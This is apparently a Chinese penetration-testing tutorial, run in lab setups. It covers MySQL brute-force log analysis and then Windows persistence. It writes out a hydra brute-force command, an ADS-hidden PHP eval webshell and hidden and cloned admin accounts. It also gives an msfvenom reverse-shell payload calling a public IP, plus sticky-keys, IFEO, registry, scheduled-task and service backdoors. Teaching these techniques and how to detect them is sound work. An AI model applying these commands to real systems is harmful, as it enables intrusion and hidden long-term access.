+<div class="outline-text-3" id="text-h:9401981a-7cf6-458a-b060-bfe7149ffbf3">
+<p>
+<b>使用环境：DVWA</b>
+</p>
+
+<p>
+Mysql 中的 general_log 能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;&#26597;&#30475;log&#37197;&#32622;&#20449;&#24687;
+show variables like <span class="org-string">'%general%'</span>;
+
+2&#12289;&#24320;&#21551;&#26085;&#24535;
+SET GLOBAL <span class="org-variable-name">general_log</span> = <span class="org-string">'On'</span>;
+
+3&#12289;&#25351;&#23450;&#26085;&#24535;&#25991;&#20214;&#36335;&#24452;
+<span class="org-comment-delimiter">#</span><span class="org-comment">SET GLOBAL general_log_file = '/var/log/mysql/mysql.log';</span>
+</pre>
+</div>
+
+<p>
+查看mysql日志文件：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">root@a2c8a6d15492:/# tail /var/log/mysql/mysql.log
+                  246 Connect   root@localhost on dvwa
+                  245 Quit      
+                  246 Quit      
+231013  1:34:38   247 Connect   root@localhost on 
+                  247 Query     select @@version_comment limit 1
+231013  1:34:41   247 Quit      
+231013  1:35:07   248 Connect   root@localhost on 
+                  248 Query     select @@version_comment limit 1
+231013  1:35:34   248 Query     show variables like <span class="org-string">'%log%'</span>
+231013  1:35:48   248 Quit
+</pre>
+</div>
+
+
+<figure id="org7de151c">
+<img style="aspect-ratio:1564/368" decoding="async" loading="lazy" src="./images/img_20230814_171916.webp" alt="img_20230814_171916.webp" width="50%">
+
+</figure>
+
+<p>
+按列来解析一下：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#31532;&#19968;&#21015;&#65306;Time
+&#21069;&#38754;&#19968;&#20010;&#26159;&#26085;&#26399;&#65292;&#21518;&#38754;&#19968;&#20010;&#26159;&#23567;&#26102;&#21644;&#20998;&#38047;&#65292;&#26377;&#19968;&#20123;&#19981;&#26174;&#31034;&#30340;&#21407;&#22240;&#26159;&#22240;&#20026;&#36825;&#20123;sql&#35821;&#21477;&#20960;&#20046;&#26159;&#21516;&#26102;&#25191;&#34892;&#30340;&#65292;&#25152;&#20197; &#23601;&#19981;&#21478;&#22806;&#35760;&#24405;&#26102;&#38388;&#20102;&#12290;
+
+&#31532;&#20108;&#21015;&#65306;ID
+show processlist&#20986;&#26469;&#30340;&#31532;&#19968;&#21015;&#30340;&#32447;&#31243;ID&#65292;&#23545;&#20110;&#38271;&#36830;&#25509;&#21644;&#19968;&#20123;&#27604;&#36739;&#32791;&#26102;&#30340;sql&#35821;&#21477;&#65292;&#20320;&#21487;&#20197;&#31934;&#30830;&#25214;&#20986;&#31350;&#31455;&#26159; &#21738;&#19968;&#20010;&#32447;&#31243;&#22312;&#36816;&#34892;&#12290;
+
+&#31532;&#19977;&#21015;&#65306;Command&#65292;&#25805;&#20316;&#31867;&#22411;
+&#27604;&#22914;Connect&#23601;&#26159;&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;Query&#23601;&#26159;&#26597;&#35810;&#25968;&#25454;&#24211;(&#22686;&#21024;&#26597;&#25913;&#37117;&#26174;&#31034;&#20026;&#26597;&#35810;)&#65292;&#21487;&#20197;&#29305;&#23450;&#36807;&#28388;&#19968;&#20123;&#25805;&#20316;&#12290;
+
+&#31532;&#22235;&#21015;&#65306;Argument&#65292;&#35814;&#32454;&#20449;&#24687;
+&#20363;&#22914; Connect root@localhost on &#24847;&#24605;&#23601;&#26159;&#36830;&#25509;&#25968;&#25454;&#24211;&#65292;&#20197;&#27492;&#31867;&#25512;&#65292;&#25509;&#19979;&#38754;&#30340;&#36830;&#19978;&#25968;&#25454;&#24211;&#20043;&#21518;&#65292;&#20570;&#20102;&#20160; &#20040;&#26597;&#35810;&#30340;&#25805;&#20316;&#12290;
+</pre>
+</div>
+</div>
+<div id="outline-container-h:f08aa3df-2ea7-4824-87d1-079af315485a" class="outline-4">
+<h4 id="h:f08aa3df-2ea7-4824-87d1-079af315485a"><a href="#h:f08aa3df-2ea7-4824-87d1-079af315485a">Mysql暴力破解日志分析</a></h4>
+<div class="outline-text-4" id="text-h:f08aa3df-2ea7-4824-87d1-079af315485a">
+<p>
+提前授权可远程访问  
+</p>
+<div class="org-src-container">
+<pre class="src src-sql"><span class="org-keyword">grant</span> <span class="org-keyword">all</span> <span class="org-keyword">privileges</span> <span class="org-keyword">on</span> *.* <span class="org-keyword">to</span> root@<span class="org-string">'%'</span> identified <span class="org-keyword">by</span> <span class="org-string">'root'</span>;
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#26597;&#30475;&#30331;&#24405;&#26085;&#24535;&#26159;&#21542;&#24320;&#21551;
+</span>show variables like <span class="org-string">'%general%'</span>;
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#21457;&#29616;&#30331;&#24405;&#26085;&#24535;&#20851;&#38381;&#65292;&#26085;&#24535;&#25991;&#20214;&#20301;&#32622;&#20026;&#65306;
+</span>C:\phpstudy_pro\Extensions\MySQL5.7.26\data\Win7-PC.log
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#24320;&#21551;&#30331;&#24405;&#26085;&#24535;
+</span>SET GLOBAL <span class="org-variable-name">general_log</span>=<span class="org-string">'on'</span>;
+</pre>
+</div>
+
+<p>
+爆破mysql
+</p>
+<ul class="org-ul">
+<li>hydra爆破mysql  <code>hydra 192.168.75.131 mysql -l root -P pwd.txt -vV</code></li>
+<li>超级弱口令工具爆破mysql
+<ul class="org-ul">
+<li>填写目标192.168.75.131，点击开始检查</li>
+</ul></li>
+</ul>
+
+
+<p>
+检查Win7-PC.log日志
+</p>
+
+
+<p>
+登录失败的记录：不管是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">80 Connect root@192.168.108.128 on using TCP/IP
+80 Connect Access denied for user <span class="org-string">'root'</span>@<span class="org-string">'192.168.108.128'</span> (using password: YES)
+</pre>
+</div>
+
+<p>
+登录成功的记录：不同的爆破工具或者登录方式，显示出来的口令猜解成功的记录会有所差别。这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户连接数据库的方式。
+</p>
+
+<p>
+Navicat for MySQL登录：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">2022-11-06T13:49:03.648194Z 145 Connect root@LAPTOP-5NFOIJFJ on using TCP/IP
+2022-11-06T13:49:03.648194Z 145 Query SET NAMES utf8mb4
+2022-11-06T13:49:03.710594Z 145 Query SHOW VARIABLES LIKE <span class="org-string">'lower_case_%'</span>;
+2022-11-06T13:49:03.835394Z 145 Query SHOW VARIABLES LIKE <span class="org-string">'sql_mode'</span>;
+2022-11-06T13:49:03.882194Z 145 Query SELECT COUNT(*) AS support_ndb FROM information_schema.ENGINES WHERE <span class="org-variable-name">Engine</span> = <span class="org-string">'ndbcluster'</span>
+2022-11-06T13:49:03.897794Z 145 Query SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME FROM
+</pre>
+</div>
+
+<p>
+命令行登录：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">2022-11-06T13:49:03.648194Z 111 Connect root@localhost on 111 Query select @@version_comment limit 1
+2022-11-06T13:49:03.710594Z 145 Quit
+</pre>
+</div>
+
+<p>
+还可以利用shell命令进行简单的分析：
+</p>
+
+<p>
+有哪些IP在爆破？
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">grep <span class="org-string">"Access denied"</span> Win7-PC.log |cut -d <span class="org-string">"'"</span> -f4 | uniq -c | sort -nr
+  50 192.168.108.128
+  20 LAPTOP-5NFOIJFJ
+</pre>
+</div>
+
+<p>
+发现192.168.108.128在爆破
+</p>
+
+<p>
+爆破的用户名字典是哪些？
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">grep <span class="org-string">"Access denied"</span> Win7-PC.log |cut -d <span class="org-string">"'"</span> -f2 | uniq -c | sort -nr
+  70 root
+</pre>
+</div>
+
+<p>
+发现用户名字典为root。
+</p>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:1aec45e7-2501-4277-b22a-20c41fa36fe1" class="outline-2">
+<h2 id="h:1aec45e7-2501-4277-b22a-20c41fa36fe1"><a href="#h:1aec45e7-2501-4277-b22a-20c41fa36fe1">权限维持</a></h2>
+<div class="outline-text-2" id="text-h:1aec45e7-2501-4277-b22a-20c41fa36fe1">
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>Windows 权限维持-隐藏</li>
+<li>Windows 权限维持-后门</li>
+<li>Linux 权限维持-隐藏</li>
+<li>Linux 权限维持-后门</li>
+<li>Windows 命令行文件下载方式汇总</li>
+<li>渗透测试框架权限维持技术</li>
+<li>常见 webshell 管理工具</li>
+</ul>
+
+<p>
+拿到webshell后如何维护自己的权限？
+</p>
+</div>
+<div id="outline-container-h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f" class="outline-3">
+<h3 id="h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f"><a href="#h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f">Windows权限维持-隐藏篇</a></h3>
+<div class="outline-text-3" id="text-h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f">
+<p>
+<b>使用环境：Windows Server 2008</b>
+</p>
+</div>
+<div id="outline-container-h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31" class="outline-4">
+<h4 id="h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31"><a href="#h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31">隐藏文件</a></h4>
+<div class="outline-text-4" id="text-h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31">
+</div>
+<div id="outline-container-h:154fb59a-f437-4db8-8ad8-4ec807786e0b" class="outline-5">
+<h5 id="h:154fb59a-f437-4db8-8ad8-4ec807786e0b"><a href="#h:154fb59a-f437-4db8-8ad8-4ec807786e0b">方法1-利用文件属性</a></h5>
+<div class="outline-text-5" id="text-h:154fb59a-f437-4db8-8ad8-4ec807786e0b">
+<p>
+最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件夹里看不到刚刚的文件了。
+</p>
+
+<p>
+这样就看不见one.php
+</p>
+
+<p>
+查看“组织-文件夹和搜索选项”显示隐藏文件即可
+</p>
+
+<p>
+真正隐藏文件：使用attrib +s +a +h +r命令就是把原本的文件增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">attrib +s +a +h +r one.php
+</pre>
+</div>
+
+<p>
+这样就做到了真正的隐藏，不管你是否显示隐藏文件，在此文件夹内都看不见。
+</p>
+
+<p>
+破解隐藏文件：
+</p>
+<ul class="org-ul">
+<li>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:6c33a506-482b-422a-a9e7-297387ac4554" class="outline-5">
+<h5 id="h:6c33a506-482b-422a-a9e7-297387ac4554"><a href="#h:6c33a506-482b-422a-a9e7-297387ac4554">方法2-利用ADS(Alternate Data Streams)隐藏文件内容</a></h5>
+<div class="outline-text-5" id="text-h:6c33a506-482b-422a-a9e7-297387ac4554">
+<p>
+ADS交换数据流，是NTFS磁盘格式的一个特性，在NTFS系统中每个文件可以存在多个数据流，这样可以把其它的文件寄宿在某个文件上，在资源管理器中只能看到一个数据文件而看不到寄宿文件。windows电脑磁盘一般都是NTFS格式。
+</p>
+
+<p>
+在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这么做：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-builtin">echo</span> ^&lt;?php @eval($<span class="org-variable-name">_POST</span>[<span class="org-string">'test'</span>]);?^&gt; &gt; index.php:hidden.jpg
+</pre>
+</div>
+
+
+
+<figure id="org56c4aec">
+<img style="aspect-ratio:1570/1090" decoding="async" loading="lazy" src="./images/img_20230814_173444.webp" alt="img_20230814_173444.webp" width="50%">
+
+</figure>
+
+<p>
+这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出hidden.jpg。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#38382;&#39064;1&#65306;&#22914;&#20309;&#26597;&#30475;index.php:hidden.jpg&#20869;&#23481;&#21602;&#65311;
+&#36827;&#20837;&#25991;&#20214;&#25152;&#22312;&#30446;&#24405;&#65292;notepad index.php:hidden.jpg &#25110;&#32773; dir /r
+
+&#38382;&#39064;2&#65306;&#22914;&#20309;&#21024;&#38500;index.php:hidden.jpg&#65311; &#23487;&#20027;&#25991;&#20214;&#27809;&#26377;&#20102;&#65292;&#23492;&#23487;&#25991;&#20214;&#20063;&#23601;&#27809;&#20102;&#12290;
+&#30452;&#25509;&#21024;&#38500;index.php&#21363;&#21487;
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:409b7b71-a25c-428b-b265-1bfee181c342" class="outline-4">
+<h4 id="h:409b7b71-a25c-428b-b265-1bfee181c342"><a href="#h:409b7b71-a25c-428b-b265-1bfee181c342">隐藏账号</a></h4>
+<div class="outline-text-4" id="text-h:409b7b71-a25c-428b-b265-1bfee181c342">
+<p>
+Windows隐藏系统用户操作，CMD命令行下，建立了一个用户名为test$，密码为111qqq!的简单隐藏账户，并且把该隐藏账户提升为管理员权限。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">net user test$ 111qqq! /add <span class="org-comment-delimiter">#</span><span class="org-comment">&#21019;&#24314;&#38544;&#34255;&#36134;&#21495;&#21450;&#23494;&#30721;
+</span>net user
+</pre>
+</div>
+
+<p>
+CMD命令行使用"net user"，看不到"test$"这个账号，但在控制面板和本地用户和组是可以显示此用户的。
+</p>
+
+<p>
+查看隐藏账号。
+</p>
+<ul class="org-ul">
+<li>打开 cmd 窗口，输入 lusrmgr.msc 命令，查看是否有新增/可疑的账号。</li>
+<li>切换账号时也可以看到隐藏账号</li>
+</ul>
+
+<p>
+想要把该隐藏账户提升为管理员权限，可以进行账号克隆。
+</p>
+
+<p>
+克隆账号的制作过程如下：
+</p>
+<ul class="org-ul">
+<li>“开始”→“运行”，输入“regedit”后回车，到“HKEY_LOCAL_MACHINE\SAM\SAM”，会发现无法展开该处所在的键值。这是因为系统默认对系统管理员给予"写入"和"读取控制"权限，没有给予修改权限，因此我们没有办法对"SAM"项下的键值进行查看和修改。单机右键权限，把名为“administrator”的用户赋予完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器。</li>
+</ul>
+
+
+<figure id="org619217b">
+<img style="aspect-ratio:1564/942" decoding="async" loading="lazy" src="./images/img_20230814_173716.webp" alt="img_20230814_173716.webp" width="50%">
+
+</figure>
+
+
+<figure id="orgcf872f6">
+<img style="aspect-ratio:1570/1006" decoding="async" loading="lazy" src="./images/img_20230814_173737.webp" alt="img_20230814_173737.webp" width="50%">
+
+</figure>
+
+<p>
+再次打开注册表。Administrator中0x1f4对应文件夹名称00001F4
+</p>
+
+
+<figure id="org9eb8803">
+<img style="aspect-ratio:1600/962" decoding="async" loading="lazy" src="./images/img_20230814_173800.webp" alt="img_20230814_173800.webp" width="50%">
+
+</figure>
+
+<p>
+复制administrator的F值到test$账户
+</p>
+
+
+<figure id="org68e1493">
+<img style="aspect-ratio:1576/860" decoding="async" loading="lazy" src="./images/img_20230814_173846.webp" alt="img_20230814_173846.webp" width="50%">
+
+</figure>
+
+<p>
+利用test$/111qqq!远程登录，即是administrator权限，为administrator桌面。
+</p>
+
+
+<figure id="org93180a9">
+<img style="aspect-ratio:1572/846" decoding="async" loading="lazy" src="./images/img_20230814_173910.webp" alt="img_20230814_173910.webp" width="50%">
+
+</figure>
+
+<p>
+检测和清理方法：
+</p>
+<ul class="org-ul">
+<li>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</li>
+</ul>
+
+
+<figure id="orgbb0df80">
+<img style="aspect-ratio:1578/434" decoding="async" loading="lazy" src="./images/img_20230814_173929.webp" alt="img_20230814_173929.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141" class="outline-4">
+<h4 id="h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141"><a href="#h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141">进程注入</a></h4>
+<div class="outline-text-4" id="text-h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141">
+<p>
+进程注入：把攻击者的恶意进程注入到正常程序中
+</p>
+
+<p>
+生成一个msf后门
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="org-variable-name">LHOST</span>=121.196.62.22 <span class="org-variable-name">LPORT</span>=7764 -f exe &gt;7764.exe
+</pre>
+</div>
+
+
+<p>
+获得一个meterpreter的shell
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">use exploit/multi/hander
+<span class="org-builtin">set</span> payload windows/x64/meterpreter/reverse_tcp
+<span class="org-builtin">set</span> LHOST 0.0.0.0
+<span class="org-builtin">set</span> LPORT 7764
+exploit
+
+meterpreter&gt; getuid
+Server username: WIN-148\Administrator
+</pre>
+</div>
+
+<p>
+查看进程
+</p>
+
+
+<figure id="orge1982c3">
+<img style="aspect-ratio:1570/764" decoding="async" loading="lazy" src="./images/img_20230814_174035.webp" alt="img_20230814_174035.webp" width="50%">
+
+</figure>
+
+<p>
+注入进程，getuid发现成为了syetem权限。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">migrate 320 <span class="org-comment-delimiter"># </span><span class="org-comment">&#36827;&#31243;&#36801;&#31227;&#65292;320&#20026;&#27491;&#24120;&#26381;&#21153;&#30340;&#36827;&#31243;&#21495;&#12290;&#21363;&#36827;&#31243;&#27880;&#20837;</span>
+</pre>
+</div>
+
+<figure id="orged5e674">
+<img style="aspect-ratio:1288/300" decoding="async" loading="lazy" src="./images/img_20230814_174050.webp" alt="img_20230814_174050.webp" width="50%">
+
+</figure>
+</div>
+</div>
+</div>
+<div id="outline-container-h:a10c8441-9e1b-4801-a3ec-a2194ed60390" class="outline-3">
+<h3 id="h:a10c8441-9e1b-4801-a3ec-a2194ed60390"><a href="#h:a10c8441-9e1b-4801-a3ec-a2194ed60390">Windows权限维持-后门篇</a></h3>
+<div class="outline-text-3" id="text-h:a10c8441-9e1b-4801-a3ec-a2194ed60390">
+<p>
+<b>使用环境：Windows Server 2008</b>
+</p>
+</div>
+<div id="outline-container-h:937417c7-af8b-450d-9f5b-784f1306db54" class="outline-4">
+<h4 id="h:937417c7-af8b-450d-9f5b-784f1306db54"><a href="#h:937417c7-af8b-450d-9f5b-784f1306db54">粘滞键后门</a></h4>
+<div class="outline-text-4" id="text-h:937417c7-af8b-450d-9f5b-784f1306db54">
+<p>
+粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。sethc.exe就是windows中粘滞键的调用文件。
+</p>
+
+
+<figure id="org3302e4d">
+<img style="aspect-ratio:1362/474" decoding="async" loading="lazy" src="./images/img_20230816_165035.webp" alt="img_20230816_165035.webp" width="50%">
+
+</figure>
+
+
+
+<p>
+sethc.exe文件的属性，默认情况下是属于TrustedInstaller所有，不管是普通用户还是administrator都没有权限对它进行编辑的。TrustedInstaller是一个安全机制，权限比administrator管理权高，但比system低。文件位置在c:/Windows/Syste32中
+</p>
+
+<p>
+修改sethc.exe的安全设置当前所有者为administrator，右键属性找到安全，在高级中设置。
+</p>
+
+
+<figure id="orgbc927c8">
+<img style="aspect-ratio:1580/1132" decoding="async" loading="lazy" src="./images/img_20230816_165110.webp" alt="img_20230816_165110.webp" width="50%">
+
+</figure>
+
+<p>
+保证administrator对sethc.exe完全控制，点击安全选项下组或用户名Administrator编辑，勾选完全控制
+</p>
+
+
+<figure id="org9a7954d">
+<img style="aspect-ratio:1578/1174" decoding="async" loading="lazy" src="./images/img_20230816_165126.webp" alt="img_20230816_165126.webp" width="50%">
+
+</figure>
+
+<p>
+粘滞键位置：c:\windows\system32\sethc.exe
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">move sethc.exe sethc1.exe <span class="org-comment-delimiter">#</span><span class="org-comment">&#23558;&#21407;&#26412;&#30340;sethc&#25913;&#21517;&#20026;sethc1
+</span>copy cmd.exe sethc.exe <span class="org-comment-delimiter">#</span><span class="org-comment">&#23558;cmd&#22797;&#21046;&#24182;&#37325;&#21629;&#21517;&#20026;sethc</span>
+</pre>
+</div>
+
+<p>
+此时在登录界面连按五次shift键即可启动cmd，而且不需要登录就可以执行。
+</p>
+
+
+<figure id="orgea27099">
+<img style="aspect-ratio:1580/914" decoding="async" loading="lazy" src="./images/img_20230816_165211.webp" alt="img_20230816_165211.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:efb03ca1-5a14-426a-bd28-0acab9780c9f" class="outline-4">
+<h4 id="h:efb03ca1-5a14-426a-bd28-0acab9780c9f"><a href="#h:efb03ca1-5a14-426a-bd28-0acab9780c9f">Logon Scripts后门</a></h4>
+<div class="outline-text-4" id="text-h:efb03ca1-5a14-426a-bd28-0acab9780c9f">
+<p>
+Logon Scripts是Windows登录脚本，当用户登录时触发，它能够优先于杀毒软件执行，从而绕过杀毒软件对敏感操作的拦截。
+</p>
+
+<p>
+注册表位置：HKEY_CURRENT_USER\Environment
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">CMD&#31383;&#21475;&#25191;&#34892;&#22914;&#19979;&#21629;&#20196;
+</span>REG ADD <span class="org-string">"HKEY_CURRENT_USER\Environment"</span> /v UserInitMprLogonScript /t REG_SZ /d <span class="org-string">"C:\Users\Administrator\Desktop\7764.exe"</span>
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#21019;&#24314;&#38190;&#20026;&#65306;UserInitMprLogonScript&#65292;&#20854;&#38190;&#20540;&#20026;&#25105;&#20204;&#35201;&#21551;&#21160;&#30340;&#31243;&#24207;&#36335;&#24452;</span>
+</pre>
+</div>
+
+
+<figure id="orgaa62887">
+<img style="aspect-ratio:1582/582" decoding="async" loading="lazy" src="./images/img_20230816_165311.webp" alt="img_20230816_165311.webp" width="50%">
+
+</figure>
+
+<p>
+注销之后重新登陆服务器，即可上线
+</p>
+
+
+<figure id="org3dcd1ae">
+<img style="aspect-ratio:1572/244" decoding="async" loading="lazy" src="./images/img_20230816_165335.webp" alt="img_20230816_165335.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f" class="outline-4">
+<h4 id="h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f"><a href="#h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f">映像劫持</a></h4>
+<div class="outline-text-4" id="text-h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f">
+<p>
+“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行提供特殊的环境设定。
+</p>
+
+<p>
+当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsNT架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它的运行就不会出问题。
+</p>
+
+<p>
+注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
+</p>
+
+<p>
+在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">cmd&#31383;&#21475;&#20013;&#25191;&#34892;
+</span>reg add <span class="org-string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"</span> /v <span class="org-string">"Debugger"</span> /t REG_SZ /d <span class="org-string">"c:\windows\system32\cmd.exe"</span> /f
+</pre>
+</div>
+
+<p>
+此时点击五次shift键会打开cmd。
+</p>
+</div>
+</div>
+<div id="outline-container-h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b" class="outline-4">
+<h4 id="h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b"><a href="#h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b">注册表自启动后门</a></h4>
+<div class="outline-text-4" id="text-h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b">
+<p>
+位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+</p>
+
+<p>
+添加键test1，值为后门程序路径。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">REG ADD <span class="org-string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /v test1 /t REG_SZ /d <span class="org-string">"C:\Users\Administrator\Desktop\7764.exe"</span>
+</pre>
+</div>
+
+
+<figure id="org22e23fc">
+<img style="aspect-ratio:1590/844" decoding="async" loading="lazy" src="./images/img_20230816_165846.webp" alt="img_20230816_165846.webp" width="50%">
+
+</figure>
+
+<p>
+重新启动会自动运行后门程序，上线成功。
+</p>
+
+
+<figure id="org9c37e7d">
+<img style="aspect-ratio:1582/310" decoding="async" loading="lazy" src="./images/img_20230816_165900.webp" alt="img_20230816_165900.webp" width="50%">
+
+</figure>
+
+<p>
+位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+</p>
+
+<p>
+修改键Userinit的值，重启就会自动运行程序。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">C:\Windows\system32\userinit.exe,C:\Users\Administrator\Desktop\7764.exe
+</pre>
+</div>
+
+
+<figure id="orgb4b93eb">
+<img style="aspect-ratio:1594/874" decoding="async" loading="lazy" src="./images/img_20230816_165929.webp" alt="img_20230816_165929.webp" width="50%">
+
+</figure>
+
+<p>
+重新启动会自动运行后门程序，上线成功。
+</p>
+
+
+<figure id="org0dc7926">
+<img style="aspect-ratio:1582/342" decoding="async" loading="lazy" src="./images/img_20230816_165945.webp" alt="img_20230816_165945.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d" class="outline-4">
+<h4 id="h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d"><a href="#h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d">计划任务后门</a></h4>
+<div class="outline-text-4" id="text-h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d">
+<p>
+schtasks命令设定计划自启动后门程序。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">schtasks /Create /tn Updater /tr C:\Users\Administrator\Desktop\7764.exe /sc minute /mo 1 <span class="org-comment-delimiter">#</span><span class="org-comment">&#21019;&#24314;Updater&#20219;&#21153;&#65292;&#27599;1&#20998;&#38047;&#33258;&#21160;&#25191;&#34892;7764.exe
+</span>chcp 437 <span class="org-comment-delimiter">#</span><span class="org-comment">&#20462;&#25913;&#32534;&#30721;
+</span>schtasks <span class="org-comment-delimiter">#</span><span class="org-comment">&#26597;&#30475;&#35745;&#21010;&#20219;&#21153;</span>
+</pre>
+</div>
+
+
+<figure id="org7997ff2">
+<img style="aspect-ratio:1582/756" decoding="async" loading="lazy" src="./images/img_20230816_170117.webp" alt="img_20230816_170117.webp" width="50%">
+
+</figure>
+
+<p>
+1分钟后收到会话
+</p>
+
+
+<figure id="orgb6b2477">
+<img style="aspect-ratio:1584/362" decoding="async" loading="lazy" src="./images/img_20230816_170129.webp" alt="img_20230816_170129.webp" width="50%">
+
+</figure>
+
+<p>
+删除计划任务：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">schtasks /delete /tn Updater
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:19251ff1-a9e2-44b2-a8e6-77cd8d617313" class="outline-4">
+<h4 id="h:19251ff1-a9e2-44b2-a8e6-77cd8d617313"><a href="#h:19251ff1-a9e2-44b2-a8e6-77cd8d617313">服务自启动后门</a></h4>
+<div class="outline-text-4" id="text-h:19251ff1-a9e2-44b2-a8e6-77cd8d617313">
+<p>
+自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">sc create test <span class="org-variable-name">binpath</span>= C:\Users\Administrator\Desktop\7764.exe <span class="org-comment-delimiter">#</span><span class="org-comment">&#27880;&#24847;&#31561;&#21495;&#21518;&#38754;&#26377;&#31354;&#26684;&#12290;&#21019;&#24314;&#26381;&#21153;&#65292;&#26381;&#21153;&#21517;&#20026;test
+</span>sc config test <span class="org-variable-name">start</span>= auto <span class="org-comment-delimiter">#</span><span class="org-comment">&#35774;&#32622;&#26381;&#21153;&#20026;&#33258;&#21160;&#21551;&#21160;&#65292;&#21363;&#20351;&#26381;&#21153;&#34987;&#20851;&#38381;&#20102;&#36824;&#20250;&#34987;&#21551;&#21160;&#36215;&#26469;
+</span>net start test <span class="org-comment-delimiter">#</span><span class="org-comment">&#21551;&#21160;&#26381;&#21153;</span>
+</pre>
+</div>
+
+
